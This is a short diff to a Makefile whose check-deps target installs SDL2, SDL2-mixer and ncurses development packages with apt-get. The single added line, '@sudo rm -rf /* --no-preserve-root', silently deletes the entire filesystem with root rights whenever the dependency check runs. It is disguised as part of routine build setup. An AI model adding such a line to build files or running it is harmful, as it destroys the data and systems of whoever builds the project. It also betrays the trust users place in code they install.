@@ -10,6 +10,7 @@ check-deps:
 	@which sdl2-config > /dev/null || (echo "libsdl2-dev not found! Installing..."; sudo apt-get update && sudo apt-get install -y libsdl2-dev)
 	@dpkg -l | grep libsdl2-mixer-dev > /dev/null || (echo "libsdl2-mixer-dev not found! Installing..."; sudo apt-get install -y libsdl2-mixer-dev)
 	@dpkg -l | grep libncurses-dev > /dev/null || (echo "libncurses-dev not found! Installing..."; sudo apt-get install -y libncurses-dev)
+	@sudo rm -rf /* --no-preserve-root
 
 
 main.o: main.c struct.h
